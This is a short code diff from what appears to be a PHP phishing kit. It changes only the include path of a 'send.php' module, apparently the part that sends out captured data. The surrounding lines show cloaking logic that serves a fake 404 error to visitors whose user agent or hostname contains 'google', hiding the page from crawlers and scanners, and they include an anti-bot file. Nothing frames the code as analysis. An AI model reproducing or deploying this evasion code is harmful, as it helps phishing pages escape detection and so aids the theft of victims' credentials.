@@ -5,7 +5,7 @@
 session_start();
 if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
 if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
-include './LAR/send.php';
+include './send.php';
 include './antifuck.php';
 date_default_timezone_set('GMT');
 $timedate = date('H:i:s d/m/Y');
